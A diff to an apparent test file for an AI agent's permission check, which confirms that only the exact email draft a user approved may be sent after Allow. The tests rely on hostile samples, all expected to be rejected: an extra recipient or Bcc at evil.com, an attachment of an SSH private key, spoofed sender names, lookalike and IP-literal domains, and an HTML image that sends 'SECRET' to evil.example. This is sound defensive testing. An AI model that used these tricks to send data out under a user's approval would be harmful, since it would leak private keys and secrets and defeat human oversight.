@@ -57,8 +57,10 @@ describe("the one-shot pass after Allow", () => {
 
   it("matches only the approved draft: recipients, subject and body, through the approved connector", () => {
     expect(emailSendCallMatches(draft, ...send(exact), outlook)).toBe(true);
-    // Microsoft Graph shape, HTML body that reads the same
-    expect(emailSendCallMatches(draft, ...send({ message: { subject: draft.subject, body: { contentType: "HTML", content: "<p>Bonjour Marie,</p><p>C&#39;est réglé.</p>" }, toRecipients: [{ emailAddress: { address: "marie@example.com" } }], ccRecipients: [{ emailAddress: { address: "LUC@example.com" } }] }, saveToSentItems: true }), outlook)).toBe(true);
+    // Microsoft Graph shape with the exact text body
+    expect(emailSendCallMatches(draft, ...send({ message: { subject: draft.subject, body: { contentType: "Text", content: draft.body }, toRecipients: [{ emailAddress: { address: "marie@example.com" } }], ccRecipients: [{ emailAddress: { address: "LUC@example.com" } }] }, saveToSentItems: true }), outlook)).toBe(true);
+    // the same words as HTML are not the approved text
+    expect(emailSendCallMatches(draft, ...send({ message: { subject: draft.subject, body: { contentType: "HTML", content: "<p>Bonjour Marie,</p><p>C&#39;est réglé.</p>" }, toRecipients: [{ emailAddress: { address: "marie@example.com" } }], ccRecipients: [{ emailAddress: { address: "luc@example.com" } }] } }), outlook)).toBe(false);
     // one more recipient, one missing, a Cc moved to To, another subject, not a send
     expect(emailSendCallMatches(draft, ...send({ ...exact, to: ["marie@example.com", "x@evil.com"] }), outlook)).toBe(false);
     expect(emailSendCallMatches(draft, ...send({ ...exact, cc: [] }), outlook)).toBe(false);
@@ -75,6 +77,23 @@ describe("the one-shot pass after Allow", () => {
     expect(emailSendCallMatches(draft, ...send({ ...exact, attachments: [{ path: "/Users/jc/.ssh/id_rsa" }] }), outlook)).toBe(false);
     expect(emailSendCallMatches(draft, ...send({ ...exact, headers: { "X-Evil": "1" } }), outlook)).toBe(false);
     expect(emailSendCallMatches(draft, ...send({ ...exact, bcc: ["spy@evil.com"] }), outlook)).toBe(false);
+  });
+
+  it("round 2: any recipient not parsed as an approved address, a spoofed name, HTML extras or a forward do not match", () => {
+    const one = { to: ["client@acme.com"], cc: [], bcc: [], subject: "Facture", body: "Bonjour, voir la facture." };
+    const call = (args: unknown, tool = "mcp__outlook__send_mail") => emailSendCallMatches(one, tool, JSON.stringify(args), outlook);
+    const base = { to: ["client@acme.com"], subject: "Facture", body: one.body };
+    expect(call(base)).toBe(true);
+    expect(call({ ...base, to: ["client@acme.com", "x <exfil@[203.0.113.5]>"] })).toBe(false);
+    expect(call({ ...base, to: ["client@acme.com", "x <exfil@example.рф>"] })).toBe(false);
+    expect(call({ ...base, to: "client@acme.com, x <exfil@example.xn--p1ai>" })).toBe(false);
+    expect(call({ ...base, to: ["client@acme.com", "not an address"] })).toBe(false);
+    expect(call({ ...base, to: ["Acme CEO <client@acme.com>"] })).toBe(false);
+    expect(call({ message: { toRecipients: [{ emailAddress: { address: "client@acme.com", name: "Acme CEO <ceo@acme.com>" } }], subject: "Facture", body: { contentType: "Text", content: one.body } } })).toBe(false);
+    expect(call({ ...base, contentType: "html", body: "Bonjour, voir la <!-- SECRET --><a href=\"https://evil.example/pay\">facture</a>.<img src=\"https://evil.example/p?d=SECRET\">" })).toBe(false);
+    expect(call({ ...base, body: `${one.body}<img src=x>` })).toBe(false);
+    expect(call(base, "mcp__outlook__forward_mail")).toBe(false);
+    expect(call(base, "mcp__outlook__reply_mail")).toBe(false);
   });
 
   it("B3: another connector's send is not covered", () => {
